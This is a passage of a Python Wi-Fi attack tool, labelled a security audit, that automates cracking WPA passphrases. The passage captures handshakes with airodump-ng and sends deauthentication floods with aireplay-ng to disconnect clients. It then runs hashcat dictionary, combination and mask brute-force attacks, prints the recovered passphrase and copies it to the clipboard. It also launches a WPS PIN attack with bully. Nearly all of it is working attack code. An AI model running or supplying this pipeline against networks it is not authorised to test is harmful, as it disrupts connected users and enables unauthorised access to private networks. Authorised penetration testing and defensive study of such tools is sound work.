            return vector
        log_err("Invalid selection. Choose A, B, C, D, or E.")


# -----------------------------------------------------------------------------
# MASK FILE GENERATION
# -----------------------------------------------------------------------------
def build_mask_file():
    mask_lines = [
        "?d?d?d?d?d?d?d?d",
        "?d?d?d?d?d?d?d?d?d",
        "?d?d?d?d?d?d?d?d?d?d",
        "?d?d?d?d?d?d?d?d?d?d?d",
        "?d?d?d?d?d?d?d?d?d?d?d?d",
        "?1?1?1?1?1?1?1?1,?1=?l?d",
        "?1?1?1?1?1?1?1?1?1,?1=?l?d",
        "?1?1?1?1?1?1?1?1?1?1,?1=?l?d",
        "?1?1?1?1?1?1?1?1?1?1?1,?1=?l?d",
        "?1?1?1?1?1?1?1?1?1?1?1?1,?1=?l?d",
        "?1?1?1?1?1?1?1?1,?1=?l?u?d",
        "?1?1?1?1?1?1?1?1?1,?1=?l?u?d",
        "?1?1?1?1?1?1?1?1?1?1,?1=?l?u?d",
        "?1?1?1?1?1?1?1?1?1?1?1,?1=?l?u?d",
        "?1?1?1?1?1?1?1?1?1?1?1?1,?1=?l?u?d",
        "?a?a?a?a?a?a?a?a",
        "?a?a?a?a?a?a?a?a?a",
        "?a?a?a?a?a?a?a?a?a?a",
        "?a?a?a?a?a?a?a?a?a?a?a",
        "?a?a?a?a?a?a?a?a?a?a?a?a",
    ]
    mask_file = os.path.join(TMP_DIR, "smart_sequential.hcmask")
    with open(mask_file, "w") as fh:
        fh.write("\n".join(mask_lines) + "\n")
    return mask_file


# -----------------------------------------------------------------------------
# PHASE 3 - HASHCAT GPU COMPUTE
# -----------------------------------------------------------------------------
def run_hashcat(attack_vector):
    global hashcat_session_name, hashcat_potfile

    if not hc22000_file or not os.path.isfile(hc22000_file) or os.path.getsize(hc22000_file) == 0:
        log_err("No valid .hc22000 file. Cannot run hashcat.")
        return 3

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    hashcat_session_name = f"wifi_{target_essid_safe}_{timestamp}"
    hashcat_potfile = os.path.join(TMP_DIR, f"{hashcat_session_name}.pot")
    thermal_sentinel = os.path.join(TMP_DIR, f"thermal_{timestamp}.sentinel")

    if gpu_available and cuda_available:
        backend_flags = ["--backend-ignore-opencl", "-d", "1"]
        log_gpu("Backend: CUDA (primary)")
    elif gpu_available:
        backend_flags = ["--backend-ignore-cuda", "-D", "2"]
        log_gpu("Backend: OpenCL GPU (fallback)")
    else:
        backend_flags = ["--backend-ignore-cuda"]
        log_gpu("Backend: CPU/OpenCL fallback (CUDA unavailable)")

    common_flags = [
        "-m", str(HASHCAT_MODE),
        "-w", str(HASHCAT_WORKLOAD),
        f"--hwmon-temp-abort={GPU_TEMP_ABORT}",
        f"--potfile-path={hashcat_potfile}",
        f"--session={hashcat_session_name}",
        "--status",
        "--status-timer=10",
        "-O",
    ]

    attack_flags = []
    attack_description = ""

    if attack_vector == "A":
        if not final_wordlist or not (os.path.isdir(final_wordlist) or os.path.isfile(final_wordlist)):
            log_err("Dictionary attack requires a wordlist or directory - none available.")
            return 3
        rules_file = os.path.join(HASHCAT_RULES_DIR, "best64.rule")
        if not os.path.isfile(rules_file):
            log_warn("best64.rule not found at default path - searching...")
            rules_file = ""
            try:
                result = subprocess.run(
                    ["find", "/usr", "/opt", REAL_HOME, "-name", "best64.rule", "-type", "f"],
                    capture_output=True, text=True,
                )
                candidates = [l for l in result.stdout.splitlines() if l.strip()]
                if candidates:
                    rules_file = candidates[0]
            except Exception:
                pass
        if rules_file:
            attack_flags = ["-a", "0", "-r", rules_file, hc22000_file, final_wordlist]
            attack_description = f"Dictionary + best64.rule: {os.path.basename(final_wordlist)}"
        else:
            log_warn("No rules file found. Running pure dictionary (no mutations).")
            attack_flags = ["-a", "0", hc22000_file, final_wordlist]
            attack_description = f"Dictionary (no rules): {os.path.basename(final_wordlist)}"

    elif attack_vector == "B":
        attack_flags = ["-a", "3", hc22000_file, "?d?d?d?d?d?d?d?d"]
        attack_description = "8-digit numeric brute force (?d x8)"

    elif attack_vector == "C":
        console.print()
        console.print("Mask charset reference:")
        console.print("  ?l = [a-z]   ?u = [A-Z]   ?d = [0-9]")
        console.print("  ?s = special  ?a = all printable")
        console.print("Examples:")
        console.print("  ?u?l?l?l?l?d?d?d   -> Abcde123 style")
        console.print("  ?d?d?d?d?d?d?d?d?d?d -> 10-digit numeric")
        console.print()
        custom_mask = input("Enter mask: ").strip()
        if not custom_mask:
            log_err("No mask entered. Skipping.")
            return 3
        attack_flags = ["-a", "3", hc22000_file, custom_mask]
        attack_description = f"Custom mask: {custom_mask}"

    elif attack_vector == "D":
        if not final_wordlist or not os.path.isfile(final_wordlist):
            log_err("Combination attack requires a single wordlist file - none available.")
            return 3
        console.print()
        console.print("Combination: word1 + word2")
        console.print("Press ENTER to use the same wordlist for both halves.")
        console.print()
        second_wl = final_wordlist
        second_input = input("Path to second wordlist (ENTER = same as first): ").strip()
        if second_input:
            if os.path.isfile(second_input) and os.access(second_input, os.R_OK):
                second_wl = second_input
            else:
                log_warn("Second wordlist not readable. Using primary for both halves.")
        attack_flags = ["-a", "1", hc22000_file, final_wordlist, second_wl]
        attack_description = f"Combination: {os.path.basename(final_wordlist)} x {os.path.basename(second_wl)}"

    elif attack_vector == "E":
        mask_file = build_mask_file()
        attack_flags = ["-a", "3", hc22000_file, mask_file]
        attack_description = "Smart Sequential Brute Force (Mask File Strategy)"

    console.print()
    log_gpu("+------------------------------+")
    log_gpu("|       GPU Compute Session      |")
    log_gpu("+------------------------------+")
    log_gpu(f"Target ESSID : {target_essid}")
    log_gpu(f"Target BSSID : {target_bssid}")
    log_gpu(f"Hash file    : {os.path.basename(hc22000_file)}")
    log_gpu(f"Hash mode    : -m {HASHCAT_MODE}  (WPA-PBKDF2-PMKID+EAPOL)")
    log_gpu(f"Attack       : {attack_description}")
    log_gpu(f"Workload     : -w {HASHCAT_WORKLOAD}  (High / 96 ms kernel)")
    log_gpu(f"Temp limit   : {GPU_TEMP_ABORT}C  (watchdog + --hwmon-temp-abort)")
    log_gpu(f"Session      : {hashcat_session_name}")
    log_gpu(f"Potfile      : {os.path.basename(hashcat_potfile)}")
    console.print()
    log_info("Launching GPU compute pipeline...")
    log_info("Hashcat keys while running:  [s] status   [p] pause   [q] quit+checkpoint")
    console.print()

    stop_event = threading.Event()
    watchdog_thread = threading.Thread(
        target=gpu_thermal_watchdog, args=(thermal_sentinel, stop_event), daemon=True
    )
    if gpu_available:
        watchdog_thread.start()

    cmd = ["hashcat", *backend_flags, *common_flags, *attack_flags]
    log_debug(f"hashcat cmd: {' '.join(cmd)}")

    hashcat_proc = subprocess.run(cmd)
    stop_event.set()

    if gpu_available:
        watchdog_thread.join(timeout=1)
    console.print()

    if os.path.isfile(thermal_sentinel):
        with open(thermal_sentinel) as fh:
            abort_temp = fh.read().strip()
        log_err(f"Session terminated by thermal watchdog at {abort_temp}C.")
        log_warn("Allow GPU to cool, then resume with:")
        log_warn(f"  hashcat --session={hashcat_session_name} --restore")
        return 2

    if os.path.isfile(hashcat_potfile) and os.path.getsize(hashcat_potfile) > 0:
        parse_and_display_result()
        return 0

    exit_code = hashcat_proc.returncode
    log_debug(f"hashcat exit code: {exit_code}")

    if exit_code == 0:
        log_warn("All candidates exhausted - password not found.")
        log_info("Try a larger wordlist, broader mask, or additional rules.")
        return 1
    elif exit_code == 1:
        if os.path.isfile(hashcat_potfile) and os.path.getsize(hashcat_potfile) > 0:
            parse_and_display_result()
            return 0
        log_warn("Hashcat reported a crack (exit 1) but potfile is empty.")
        return 1
    elif exit_code == 2:
        log_info("Session paused/quit by user.")
        log_info(f"Resume with: hashcat --session={hashcat_session_name} --restore")
        return 1
    elif exit_code == 255:
        log_err("Hashcat fatal error (exit 255) - check GPU drivers, CUDA, and hash file.")
        return 1
    else:
        log_warn(f"Hashcat exited with code {exit_code} - password not in potfile.")
        return 1


# -----------------------------------------------------------------------------
# RESULT DISPLAY
# -----------------------------------------------------------------------------
def parse_and_display_result():
    if not os.path.isfile(hashcat_potfile) or os.path.getsize(hashcat_potfile) == 0:
        log_warn("Potfile is empty or missing.")
        return 1

    cracked_key = ""
    with open(hashcat_potfile, "r", errors="replace") as fh:
        line = fh.readline()
        idx = line.find(":")
        if idx > 0:
            cracked_key = line[idx + 1:].rstrip("\r\n")

    if not cracked_key:
        log_warn("Could not parse passphrase from potfile.")
        log_info("Raw potfile:")
        with open(hashcat_potfile, "r", errors="replace") as fh:
            console.print(fh.read())
        return 1

    gpu_stats = ""
    if gpu_available:
        gpu_stats = nvidia_query("utilization.gpu,temperature.gpu,clocks.current.sm")

    console.print()
    console.print("[bold green]+--------------------------------+[/bold green]")
    console.print("[bold green]|      PASSWORD CRACKED !!!      |[/bold green]")
    console.print("[bold green]+--------------------------------+[/bold green]")
    console.print()
    console.print(f"[bold cyan]Network   :[/bold cyan] {target_essid}")
    console.print(f"[bold cyan]BSSID     :[/bold cyan] {target_bssid}")
    console.print(f"[bold green]PASSPHRASE:[/bold green] [yellow]{cracked_key}[/yellow]")
    console.print()
    if gpu_stats:
        console.print(f"[magenta]GPU stats :[/magenta] {gpu_stats}")
    console.print()

    if copy_to_clipboard(cracked_key):
        log_success("Passphrase copied to clipboard!")
    else:
        log_warn("Clipboard unavailable - passphrase not copied.")

    log_info(f"Session artifacts saved to: {handshake_dir}")
    return 0


# -----------------------------------------------------------------------------
# CAPTURE RECORDER (AUTOMATIC, INTERNAL)
# -----------------------------------------------------------------------------
def start_recorder(capture_base):
    global recorder_proc, recorder_thread

    cmd = [
        "airodump-ng", "-c", str(target_ch),
        "--bssid", target_bssid,
        "-w", capture_base,
        "--write-interval", "1",
        "--", mon_iface,
    ]

    def watcher():
        assert recorder_proc is not None
        while True:
            raw = recorder_proc.stdout.readline()
            if not raw:
                break
            try:
                text = raw.decode("utf-8", errors="replace")
            except UnicodeDecodeError:
                continue
            console.print(f"[dim]{text.rstrip()}[/dim]")
            if "WPA handshake" in text and target_bssid in text:
                log_success(f"HANDSHAKE DETECTED: {target_bssid}")
                handshake_detected.set()

    try:
        recorder_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            start_new_session=True,
        )
    except OSError as exc:
        log_err(f"Failed to start auto-recorder: {exc}")
        recorder_proc = None
        return False
    recorder_thread = threading.Thread(target=watcher, daemon=True)
    recorder_thread.start()
    return True


# -----------------------------------------------------------------------------
# ATTACK: WPA HANDSHAKE CAPTURE + GPU CRACK
# -----------------------------------------------------------------------------
def attack_wpa_handshake_gpu():
    global hc22000_file, hashcat_potfile
    attack_vector = select_attack_vector()
    log_info(f"Attack vector selected: {attack_vector}")

    if attack_vector in ("A", "D"):
        prepare_wordlist(attack_vector)

    if not final_wordlist:
        if attack_vector in ("A", "D"):
            log_warn("No valid wordlist/directory available. Dictionary and Combination attacks disabled.")
        log_info("Mask attacks (B, C, E) do not require a wordlist.")

    while True:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        capture_base = os.path.join(handshake_dir, f"{target_essid_safe}_{timestamp}")

        console.print()
        log_info("Step 1: Handshake Capture")
        console.print("1. The [cyan]capture recorder[/cyan] starts automatically below.")
        console.print("2. Watch for '[green]HANDSHAKE DETECTED[/green]' or the airodump line")
        console.print("   'WPA handshake: <BSSID>' (top right of the recorder output).")
        console.print()

        if not start_recorder(capture_base):
            record_cmd = f"sudo airodump-ng -c {target_ch} --bssid {target_bssid} -w '{capture_base}' --write-interval 1 {mon_iface}"
            log_warn("Auto-recorder failed to start - manual capture required:")
            if copy_to_clipboard(record_cmd):
                log_success("Command copied to clipboard!")
            log_warn("Paste it in a second terminal, then continue here.")
            console.print(record_cmd)

        target_mac = ""
        user_capture_csv = f"{capture_base}-01.csv"

        handshake_ready = False
        while not handshake_ready:
            while True:
                get_connected_clients(user_capture_csv)

                console.print("\nTarget Selection:")
                console.print("1) Broadcast Deauth (Kick Everyone)")
                option_counter = 2
                if connected_clients:
                    for mac, pwr in connected_clients:
                        console.print(f"{option_counter}) Specific Client: {mac} (Signal: {pwr or '?'} dBm)")
                        option_counter += 1
                else:
                    console.print("   (No connected clients detected yet)")
                console.print("r) Refresh Client List")

                sel = input(f"Select Target [1-{option_counter - 1}] or 'r' (Default 1): ").strip() or "1"

                if sel.lower() == "r":
                    log_info("Reloading client data from capture file...")
                    time.sleep(0.5)
                    continue

                if sel.isdigit():
                    sel_int = int(sel)
                    if sel_int == 1:
                        log_info("Targeting Broadcast (All Clients)")
                        target_mac = ""
                        break
                    elif 1 < sel_int < option_counter:
                        mac, pwr = connected_clients[sel_int - 2]
                        if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
                            target_mac = mac
                            log_info(f"Targeting specific client: {target_mac}")
                            break
                        log_warn("Invalid MAC parsed. Try refreshing.")
                    else:
                        log_err("Invalid selection.")
                else:
                    log_err("Invalid selection.")

            console.print()
            log_info("Step 2: Sending Deauth Packets")

            while True:
                log_info("Sending 1 group of deauth packets...")
                if target_mac:
                    subprocess.run(
                        ["timeout", "--signal=SIGTERM", "30s",
                         "aireplay-ng", "-0", "1", "-a", target_bssid,
                         "-c", target_mac, "--", mon_iface],
                        capture_output=True,
                    )
                else:
                    subprocess.run(
                        ["timeout", "--signal=SIGTERM", "30s",
                         "aireplay-ng", "-0", "1", "-a", target_bssid,
                         "--", mon_iface],
                        capture_output=True,
                    )

                console.print()
                log_success("Deauth burst complete.")
                console.print(f"Recorder should show: 'WPA handshake: {target_bssid}'")

                decision = ""
                while True:
                    console.print("\nOptions:")
                    console.print("y) Handshake captured - start GPU cracking pipeline")
                    console.print("n) Abort this attack")
                    console.print("r) Retry deauth (send more packets)")
                    console.print("b) Back to client selection")
                    console.print("t) Back to target (network) selection")
                    decision = input("Choice [y/n/r/b/t] (Default: r): ").strip().lower() or "r"
                    if decision in ("y", "n", "r", "b", "t"):
                        break
                    log_warn("Invalid option. Try again.")

                if decision == "y":
                    handshake_ready = True
                    break
                elif decision == "r":
                    continue
                elif decision == "b":
                    break
                elif decision == "n":
                    stop_recorder()
                    log_info("Attack aborted.")
                    return 0
                elif decision == "t":
                    stop_recorder()
                    return 2

        handshake_detected.clear()
        stop_recorder()

        cap_file = f"{capture_base}-01.cap"
        if not os.path.isfile(cap_file):
            try:
                matches = [
                    os.path.join(handshake_dir, f)
                    for f in os.listdir(handshake_dir)
                    if f.startswith(f"{target_essid_safe}_{timestamp}") and f.endswith(".cap")
                ]
                if matches:
                    cap_file = matches[0]
            except OSError:
                pass

        if os.path.isfile(cap_file):
            capture_files = glob.glob(f"{capture_base}*")
            if capture_files:
                subprocess.run(
                    ["chown", f"{REAL_USER}:{REAL_GROUP}", *capture_files],
                    capture_output=True,
                )
            log_info(f"Capture file ownership transferred to {REAL_USER}.")
        else:
            log_err(f"Capture file not found: {cap_file}")
            console.print("\nOptions:")
            console.print("r) Retry capture")
            console.print("x) Exit this attack")
            no_cap = input("Selection [r/x] (Default: r): ").strip().lower() or "r"
            if no_cap == "x":
                return 0
            continue

        while True:
            console.print()
            log_info("Step 3: GPU Compute Pipeline")

            if convert_cap_to_hc22000(cap_file) != 0:
                console.print("\nHash extraction failed.")
                console.print("Options:")
                console.print("r) Retry capture (send more deauths)")
                console.print("x) Exit this attack")
                extract_choice = input("Selection [r/x] (Default: r): ").strip().lower() or "r"
                if extract_choice == "x":
                    return 0
                hc22000_file = ""
                hashcat_potfile = ""
                break

            crack_result = run_hashcat(attack_vector)

            if crack_result == 0:
                return 0
            elif crack_result == 2:
                console.print()
                log_err("Compute session aborted - GPU thermal limit reached.")
                log_info("Allow GPU to cool, then resume with:")
                log_info(f"  hashcat --session={hashcat_session_name} --restore")
                input("Press ENTER to return to the main menu...")
                return 0
            elif crack_result == 3:
                log_info(f"Cracking skipped. Hash file: {hc22000_file}")
                log_info("To crack later:")
                log_info(f"  hashcat -m {HASHCAT_MODE} -w {HASHCAT_WORKLOAD} \\")
                log_info(f"    '{hc22000_file}' /path/to/wordlist.txt")
                return 0
            else:
                console.print()
                log_warn(f"Password not found with vector: {attack_vector}")
                console.print("Options:")
                console.print("a) Try a different attack vector (reuse same .hc22000)")
                console.print("r) Re-capture handshake (full restart)")
                console.print("x) Exit this attack")
                retry_choice = input("Selection [a/r/x] (Default: a): ").strip().lower() or "a"

                if retry_choice == "a":
                    attack_vector = select_attack_vector()
                    log_info(f"New attack vector: {attack_vector}")
                    if attack_vector in ("A", "D") and not final_wordlist:
                        log_info("New attack requires a wordlist - preparing now.")
                        prepare_wordlist(attack_vector)
                    continue
                elif retry_choice == "r":
                    hc22000_file = ""
                    hashcat_potfile = ""
                    break
                else:
                    return 0

            break


# -----------------------------------------------------------------------------
# ATTACK: WPS
# -----------------------------------------------------------------------------
def attack_wps():
    log_info("Starting WPS scan via 'wash'...")
    result = subprocess.run(
        ["timeout", "--signal=SIGTERM", "15s", "wash", "-i", mon_iface],
        capture_output=True, text=True,
    )
    for line in result.stdout.splitlines():
        if target_bssid.upper() in line.upper():
            console.print(line)
    log_info("Attempting WPS attack via 'bully'...")
    log_warn("This may take a very long time. Press Ctrl+C to abort.")
    try:
        result = subprocess.run(
            ["bully", "-b", target_bssid, "-c", str(target_ch), "-v", "3", "--", mon_iface]
        )
        if result.returncode != 0:
            log_warn("Bully exited with a non-zero status.")
    except KeyboardInterrupt:
        log_warn("Bully was interrupted by user.")


# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
def main():
    console.print("==============================================")
    console.print("   Arch/Hyprland Wi-Fi Security Audit")
    console.print("   GPU-Accelerated Pipeline Edition")
    console.print("==============================================")
    console.print(f"Version: 4.0.0 | PID: {os.getpid()}")
    console.print()

    check_deps()
    probe_gpu()
    setup_directories()
    select_interface()
    enable_monitor_mode()

    while True:
        scan_targets()
        should_rescan = False

        while True:
            console.print()
            console.print("Select Attack Vector:")
            console.print("1) WPA Handshake Capture + GPU Crack  [hcxpcapngtool -> hashcat -m 22000]")
            console.print("2) WPS Attack (Bully)")
            console.print("3) Rescan Targets")
            console.print("4) Exit")

            attack_choice = input("Choice [1]: ").strip() or "1"

            if attack_choice == "1":
                result = attack_wpa_handshake_gpu()
                if result == 2:
                    log_info("Returning to network scan...")
                    should_rescan = True
                break
            elif attack_choice == "2":
                attack_wps()
                break
            elif attack_choice == "3":
                log_info("Restarting scan...")
                should_rescan = True
                break
            elif attack_choice == "4":
                log_info("Exiting.")
                sys.exit(0)
            else:
                log_err("Invalid choice.")

        if should_rescan:
            continue
        break

    console.print()
    input("Press ENTER to cleanup and exit...")


if __name__ == "__main__":
    elevate()
    make_tmp_dir()

    def _handle_signal(signum, frame):
        for sig in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT):
            try:
                signal.signal(sig, signal.SIG_DFL)
            except Exception:
                pass
        cleanup()
        sys.exit(128 + signum)

    for sig in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT):
        signal.signal(sig, _handle_signal)

    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    finally:
        cleanup()